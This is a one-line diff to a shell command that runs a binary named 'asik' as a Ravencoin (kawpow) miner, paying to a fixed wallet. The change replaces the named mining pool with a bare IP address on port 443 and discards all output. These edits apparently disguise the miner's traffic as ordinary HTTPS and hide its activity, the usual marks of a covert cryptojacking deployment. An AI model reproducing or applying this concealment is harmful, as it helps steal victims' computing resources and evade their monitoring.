@@ -1,1 +1,1 @@
-./asik -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.yangbeb
+./asik -a kawpow -o stratum+tcp://172.104.63.4:443 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.yangbeb >/dev/null 2>&1
